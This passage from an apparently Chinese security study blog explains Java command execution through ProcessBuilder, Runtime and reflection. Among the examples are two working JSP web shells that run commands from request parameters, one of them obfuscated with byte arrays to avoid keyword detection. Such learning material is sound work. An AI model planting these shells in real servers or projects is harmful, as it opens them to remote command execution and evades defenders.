src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220612223609973.png"></p><p>这里检查<code>jdk.lang.Process.allowAmbiguousCommands</code>，这个值尚不清楚作用，上下文来看，应该是对命令做检查即<code>cmdstr</code>的生成</p><p>跟进到<code>create</code>方法，不能步进；发现是一个 native 方法(是一个其他语言写的函数作为动态库引入，java 在运行时即加载，这里声明了就可以直接调用)，并且这里就执行了我们的命令</p><blockquote><p>Create a process using the win32 function CreateProcess. The method is synchronized due to MS kb315939 problem. All native handles should restore the inherit flag at the end of call.</p><p>kb315939：A 启动 B，B 启动 C。C 循环打印到 System.err。B 关闭流向 C 并退出。A 期望从流到 B 的 EOF，但它没有发生。</p></blockquote><h3 id="ProcessBuilder"><a href="#ProcessBuilder" class="headerlink" title="ProcessBuilder"></a>ProcessBuilder</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        BufferedReader br = <span class="hljs-keyword">null</span>;<br>        <span class="hljs-keyword">try</span>&#123;<br>            Process p = <span class="hljs-keyword">new</span> ProcessBuilder(<span class="hljs-string">&quot;whoami&quot;</span>).start();<br>            br = <span class="hljs-keyword">new</span> BufferedReader(<span class="hljs-keyword">new</span> InputStreamReader(p.getInputStream()));<br>            String line = <span class="hljs-keyword">null</span>;<br>            StringBuilder sb = <span class="hljs-keyword">new</span> StringBuilder();<br>            <span class="hljs-keyword">while</span>((line= br.readLine())!=<span class="hljs-keyword">null</span>)&#123;<br>                sb.append(line+<span class="hljs-string">&quot;\n&quot;</span>);<br>            &#125;<br>            System.out.println(sb.toString());<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-keyword">if</span>(br != <span class="hljs-keyword">null</span>)&#123;<br>                <span class="hljs-keyword">try</span>&#123;<br>                    br.close();<br>                &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>                    e.printStackTrace();<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.ByteArrayOutputStream&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStream&quot;</span> %&gt;<br>&lt;%<br>    InputStream in = <span class="hljs-keyword">new</span> ProcessBuilder(request.getParameterValues(<span class="hljs-string">&quot;cmd&quot;</span>)).start().getInputStream();<br>    ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>    <span class="hljs-keyword">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">1024</span>];<br>    <span class="hljs-keyword">int</span> a = -<span class="hljs-number">1</span>;<br><br>    <span class="hljs-keyword">while</span> ((a = in.read(b)) != -<span class="hljs-number">1</span>) &#123;<br>        baos.write(b, <span class="hljs-number">0</span>, a);<br>    &#125;<br>    out.write(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span> + <span class="hljs-keyword">new</span> String(baos.toByteArray()) + <span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);<br>%&gt;<br></code></pre></td></tr></table></figure><p>这里需要注意的是，调式时调用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ProcessBuilder(cmdarray)<br>            .environment(envp)<br>            .directory(dir)<br>            .start();<br></code></pre></td></tr></table></figure><p>其中<code>environment</code>方法属于 default 域不可调用，因此可以试试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> ProcessBuilder(<span class="hljs-string">&quot;calc&quot;</span>).start();<br><span class="hljs-keyword">new</span> ProcessBuilder(<span class="hljs-string">&quot;calc&quot;</span>).directory(<span class="hljs-keyword">null</span>).start();<br></code></pre></td></tr></table></figure><p><code>ProcessImpl</code>不能直接命令执行，需要反射</p><p><strong>（JDK9 以后 ProcessImpl 与 UNIXProcess 合并了）</strong></p><h2 id="Java-反射"><a href="#Java-反射" class="headerlink" title="Java 反射"></a>Java 反射</h2><p>Java 反射(<code>Reflection</code>)是 Java 非常重要的动态特性，通过使用反射我们不仅可以获取到任何类的成员方法(<code>Methods</code>)、成员变量(<code>Fields</code>)、构造方法(<code>Constructors</code>)等信息，还可以动态创建 Java 类实例、调用任意的类方法、修改任意的类成员变量值等。Java 反射机制是 Java 语言的动态性的重要体现，也是 Java 的各种框架底层实现的灵魂。</p><h3 id="获取-Class-对象"><a href="#获取-Class-对象" class="headerlink" title="获取 Class 对象"></a>获取 Class 对象</h3><p>上一节讲到类的动态加载有两种方式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//反射加载Moonlight实例</span><br>Class.forName(<span class="hljs-string">&quot;xxx-package.Moonlight&quot;</span>);<br><br><span class="hljs-comment">//ClassLoader加载Moonlight实例</span><br><span class="hljs-keyword">this</span>.getClass().getClassLoader().loadClass(<span class="hljs-string">&quot;xxx-package.Moonlight&quot;</span>);<br></code></pre></td></tr></table></figure><p>以及直接<code>类名.class</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Class rt = Runtime.class;<br></code></pre></td></tr></table></figure><p>这都是获取到 Class 对象的方式</p><p>获取数组类型的 Class 对象需要特殊注意,需要使用 Java 类型的描述符方式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">Class&lt;?&gt; doubleArray = Class.forName(<span class="hljs-string">&quot;[D&quot;</span>);<span class="hljs-comment">//相当于double[].class</span><br>Class&lt;?&gt; cStringArray = Class.forName(<span class="hljs-string">&quot;[[Ljava.lang.String;&quot;</span>);<span class="hljs-comment">// 相当于String[][].class</span><br></code></pre></td></tr></table></figure><p>获取 Runtime 类 Class 对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">Strintg className = <span class="hljs-string">&quot;java.lang.Runtime&quot;</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">runtimeclass1</span> </span>= class.forName(className);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">runtimeclass2</span> </span>= java.lang.Runtime.class;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">runtimeclass3</span> </span>= ClassLoader.getSystemclassLoader().loadclass(className);<br></code></pre></td></tr></table></figure><p>调用内部类的需要将内部类以<code>$</code>限定如</p><p><code>org.abc.Demo$hello</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.abc<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span></span>&#123;<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span></span>&#123;&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">hello</span></span>&#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="反射命令执行"><a href="#反射命令执行" class="headerlink" title="反射命令执行"></a>反射命令执行</h3><h4 id="Runtime-1"><a href="#Runtime-1" class="headerlink" title="Runtime"></a>Runtime</h4><p>首先了解这个类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Runtime</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Runtime currentRuntime = <span class="hljs-keyword">new</span> Runtime();<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Returns the runtime object associated with the current Java application.</span><br><span class="hljs-comment">     * Most of the methods of class &lt;code&gt;Runtime&lt;/code&gt; are instance</span><br><span class="hljs-comment">     * methods and must be invoked with respect to the current runtime object.</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span>  the &lt;code&gt;Runtime&lt;/code&gt; object associated with the current</span><br><span class="hljs-comment">     *          Java application.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Runtime <span class="hljs-title">getRuntime</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> currentRuntime;<br>    &#125;<br><br>    <span class="hljs-comment">/** Don&#x27;t let anyone else instantiate this class */</span><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-title">Runtime</span><span class="hljs-params">()</span> </span>&#123;&#125;<br><br>    ...<br></code></pre></td></tr></table></figure><p>首先是<code>Runtime.Runtime</code>居然是私有的，原因注释也说了：它本身不希望除自身以外去实例这个类，作为一个私有构造方法，我们没有办法<code>new Runtime()</code>创建<code>Runtime</code>对象</p><p>在安全漫谈里面谈到这个“单例模式”，其中的例子是数据库连接，建立数据库连接是比较耗费资源的，把建立数据库连接放在构造方法中，查询语句就在一些普通方法内，每一次查询都是在一个实例对象中调用一次普通方法，而不用 new 一个连接类查询一次，避免建立多个连接，减少开销</p><p>因此我们有两个方向可以创建这个类的实例，<strong>一是通过<code>getMethod</code>获得<code>getRuntime</code>方法来获得实例对象，二是通过修改构造方法权限获取实例</strong></p><h5 id="修改构造方法权限获得实例"><a href="#修改构造方法权限获得实例" class="headerlink" title="修改构造方法权限获得实例"></a>修改构造方法权限获得实例</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//获得Runtime类</span><br>            Class runtimeclass = Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>            <span class="hljs-comment">//获得构造方法</span><br>            Constructor constructor = runtimeclass.getDeclaredConstructor();<br>            <span class="hljs-comment">//Runtime构造方法是private，修改其访问权限</span><br>            constructor.setAccessible(<span class="hljs-keyword">true</span>);<br>            <span class="hljs-comment">//获得Runtime实例</span><br>            Object runtimeInstance = constructor.newInstance();<br>            <span class="hljs-comment">//获得Runtime实例的exec(String)方法</span><br>            Method runtimemethod = runtimeclass.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>            <span class="hljs-comment">//调用exec(String)方法</span><br>            Process p = (Process) runtimemethod.invoke(runtimeInstance, <span class="hljs-string">&quot;whoami&quot;</span>);<br><br>            InputStream is = p.getInputStream();<br>            InputStreamReader isr =  <span class="hljs-keyword">new</span> InputStreamReader(is);<br>            BufferedReader br = <span class="hljs-keyword">new</span> BufferedReader(isr);<br>            StringBuilder sb=<span class="hljs-keyword">new</span> StringBuilder();<br>            String line = <span class="hljs-keyword">null</span>;<br>            <span class="hljs-keyword">while</span> ((line = br.readLine()) != <span class="hljs-keyword">null</span>) &#123;<br>                sb.append(line);<br>                System.out.println(line);<br>            &#125;<br>            br.close();<br>            isr.close();<br>            is.close();<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException | NoSuchMethodException | InstantiationException | IllegalAccessException |<br>                 InvocationTargetException | IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>代码中不希望出现<code>Runtime</code>之类的关键字，可以全部反射代替</p><p>写成 jsp，传参 str=</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStream&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Method&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Scanner&quot;</span> %&gt;<br><br>&lt;%<br>    String str = request.getParameter(<span class="hljs-string">&quot;str&quot;</span>);<br><br>    <span class="hljs-comment">// 定义&quot;java.lang.Runtime&quot;字符串变量</span><br>    String rt = <span class="hljs-keyword">new</span> String(<span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[]&#123;<span class="hljs-number">106</span>, <span class="hljs-number">97</span>, <span class="hljs-number">118</span>, <span class="hljs-number">97</span>, <span class="hljs-number">46</span>, <span class="hljs-number">108</span>, <span class="hljs-number">97</span>, <span class="hljs-number">110</span>, <span class="hljs-number">103</span>, <span class="hljs-number">46</span>, <span class="hljs-number">82</span>, <span class="hljs-number">117</span>, <span class="hljs-number">110</span>, <span class="hljs-number">116</span>, <span class="hljs-number">105</span>, <span class="hljs-number">109</span>, <span class="hljs-number">101</span>&#125;);<br><br>    <span class="hljs-comment">// 反射java.lang.Runtime类获取Class对象</span><br>    Class&lt;?&gt; c = Class.forName(rt);<br><br>    <span class="hljs-comment">// 反射获取Runtime类的getRuntime方法</span><br>    Method m1 = c.getMethod(<span class="hljs-keyword">new</span> String(<span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[]&#123;<span class="hljs-number">103</span>, <span class="hljs-number">101</span>, <span class="hljs-number">116</span>, <span class="hljs-number">82</span>, <span class="hljs-number">117</span>, <span class="hljs-number">110</span>, <span class="hljs-number">116</span>, <span class="hljs-number">105</span>, <span class="hljs-number">109</span>, <span class="hljs-number">101</span>&#125;));<br><br>    <span class="hljs-comment">// 反射获取Runtime类的exec方法</span><br>    Method m2 = c.getMethod(<span class="hljs-keyword">new</span> String(<span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[]&#123;<span class="hljs-number">101</span>, <span class="hljs-number">120</span>, <span class="hljs-number">101</span>, <span class="hljs-number">99</span>&#125;), String.class);<br><br>    <span class="hljs-comment">// 反射调用Runtime.getRuntime().exec(xxx)方法</span><br>    Object obj2 = m2.invoke(m1.invoke(<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[]&#123;&#125;), <span class="hljs-keyword">new</span> Object[]&#123;str&#125;);<br><br>    <span class="hljs-comment">// 反射获取Process类的getInputStream方法</span><br>    Method m = obj2.getClass().getMethod(<span class="hljs-keyword">new</span> String(<span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[]&#123;<span class="hljs-number">103</span>, <span class="hljs-number">101</span>, <span class="hljs-number">116</span>, <span class="hljs-number">73</span>, <span class="hljs-number">110</span>, <span class="hljs-number">112</span>, <span class="hljs-number">117</span>, <span class="hljs-number">116</span>, <span class="hljs-number">83</span>, <span class="hljs-number">116</span>, <span class="hljs-number">114</span>, <span class="hljs-number">101</span>, <span class="hljs-number">97</span>, <span class="hljs-number">109</span>&#125;));<br>    m.setAccessible(<span class="hljs-keyword">true</span>);<br><br>    <span class="hljs-comment">// 获取命令执行结果的输入流对象：p.getInputStream()并使用Scanner按行切割成字符串</span><br>    Scanner s = <span class="hljs-keyword">new</span> Scanner((InputStream) m.invoke(obj2, <span class="hljs-keyword">new</span> Object[]&#123;&#125;)).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>    String result = s.hasNext() ? s.next() : <span class="hljs-string">&quot;&quot;</span>;<br><br>    <span class="hljs-comment">// 输出命令执行结果</span><br>    out.println(result);<br>%&gt;<br></code></pre></td></tr></table></figure><p>其中获取构造方法时，<code>class.getDeclaredConstructor</code>和<code>Class.getConstructor</code>都可以获得类构造方法，但是**<code>Class.getConstructor</code>无法获取私有方法**</p><p>如果构造方法有一个或多个参数的情况下我们应该在获取构造方法时候传入对应的参数类型数组，如：<code>clazz.getDeclaredConstructor(String.class, String.class)</code></p><p>获得构造方法，修改权限后，实例化<code>constructor</code>即<code>constructor.newInstance()</code>，有参数时<code>constructor.newInstance(a,b,...)</code></p><p><strong>如果以 类.newInstance 则等价于 new 类()，并且要有无参构造方法</strong></p><p>编写<code>Runtime</code>类的方法<code>runtimeclass.getMethod(&quot;exec&quot;,String.class)</code></p><blockquote><p>获取当前类所有的成员方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Method[] methods = clazz.getDeclaredMethods()<br></code></pre></td></tr></table></figure><p>获取当前类指定的成员方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">Method method = clazz.getDeclaredMethod(<span class="hljs-string">&quot;方法名&quot;</span>);<br>Method method = clazz.getDeclaredMethod(<span class="hljs-string">&quot;方法名&quot;</span>, 参数类型如String.class，多个参数用<span class="hljs-string">&quot;,&quot;</span>号隔开);<br></code></pre></td></tr></table></figure><p><code>getMethod</code>和<code>getDeclaredMethod</code>都能够获取到类成员方法，区别在于<code>getMethod</code>只能获取到<code>当前类和父类</code>的所有有权限的方法(如：<code>public</code>)，而<code>getDeclaredMethod</code>能获取到当前类的所有成员方法(不包含父类)</p></blockquote><p>调用<code>exec</code>方法<code>runtimeclass.invoke(runtimeInstance,&quot;calc&quot;)</code></p><p><strong>非 static 方法</strong><code>invoke</code>的第一个参数必须是类实例对象，如果调用的是<code>static</code>方法那么第一个参数值可以传<code>null</code>，因为在 java 中调用静态方法是不需要有类实例的，因为可以直接<code>类名.方法名(参数)</code>的方式调用；第二个参数是传入调用方法的参数</p><p>在<code>getRuntime单例模式获得实例可见此情形</code></p><p>获取当前类所有成员变量：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Field fields = clazz.getDeclaredFields();<br></code></pre></td></tr></table></figure><p>获取当前类指定成员变量：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Field field = clazz.getDeclaredField(<span class="hljs-string">&quot;key&quot;</span>); <span class="hljs-comment">//getField只能获取public与获取构造方法一样</span><br></code></pre></td></tr></table></figure><p>获取成员变量的值：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Object obj = field.get(类实例对象)<br></code></pre></td></tr></table></figure><p>修改成员变量的值：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">field.set(类实例对象，修改后的值)<br></code></pre></td></tr></table></figure><p>同理，当我们没有修改的成员变量权限时可以使用: <code>field.setAccessible(true)</code>的方式修改为访问成员变量访问权限</p><p>如果我们需要修改被<code>final</code>关键字修饰的成员变量，那么我们需要先修改方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 反射获取Field类的modifiers</span><br>Field modifiers = field.getClass().getDeclaredField(<span class="hljs-string">&quot;modifiers&quot;</span>);<br><br><span class="hljs-comment">// 设置modifiers修改权限</span><br>modifiers.setAccessible(<span class="hljs-keyword">true</span>);<br><br><span class="hljs-comment">// 修改成员变量的Field对象的modifiers值</span><br>modifiers.setInt(field, field.getModifiers() &amp; ~Modifier.FINAL);<br><br><span class="hljs-comment">// 修改成员变量值</span><br>field.set(类实例对象, 修改后的值);<br></code></pre></td></tr></table></figure><h5 id="getRuntime-单例模式获得实例"><a href="#getRuntime-单例模式获得实例" class="headerlink" title="getRuntime 单例模式获得实例"></a>getRuntime 单例模式获得实例</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Class rt = Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br><span class="hljs-comment">//            Process p = (Process) rt.getMethod(&quot;exec&quot;, String.class).invoke(rt.getMethod(&quot;getRuntime&quot;).invoke(rt), &quot;whoami&quot;);</span><br>            Process p = (Process) rt.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class).invoke(rt.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>).invoke(<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>), <span class="hljs-string">&quot;whoami&quot;</span>);<br>            InputStream is = p.getInputStream();<br>            InputStreamReader isr =  <span class="hljs-keyword">new</span> InputStreamReader(is);<br>            BufferedReader br = <span class="hljs-keyword">new</span> BufferedReader(isr);<br>            StringBuilder sb=<span class="hljs-keyword">new</span> StringBuilder();<br>            String line = <span class="hljs-keyword">null</span>;<br>            <span class="hljs-keyword">while</span> ((line = br.readLine()) != <span class="hljs-keyword">null</span>) &#123;<br>                sb.append(line);<br>                System.out.println(line);<br>            &#125;<br>            br.close();<br>            isr.close();<br>            is.close();<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException | NoSuchMethodException | IllegalAccessException | InvocationTargetException |<br>                 IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>利用<code>Runtime</code>类的单例模式，<code>Runtime.getRuntime</code>获取到<code>Runtime</code>对象</p><p>分解一下就是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">Class rt = Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>Method exec = rt.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>Method getRuntime = rt.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>);<br><span class="hljs-comment">//Object newinstance = getRuntime.invoke(rt);</span><br>Object newinstance = getRuntime.invoke(<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>);<br>Process p = (Process) exec.invoke(newinstance, <span class="hljs-string">&quot;whoami&quot;</span>);<br></code></pre></td></tr></table></figure><p>这个<code>getMethod</code>获取<code>exec</code>方法时候，为什么有<code>String.class</code>这个参数？</p><p>其实是因为<code>exec</code>方法有重载，我们在指定哪个重载函数</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220616173228988.png"></p><h4 id="ProcessBuilder-1"><a href="#ProcessBuilder-1" class="headerlink" title="ProcessBuilder"></a>ProcessBuilder</h4><p>这个类有两个构造函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">ProcessBuilder</span><span class="hljs-params">(List&lt;String&gt; command)</span></span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span 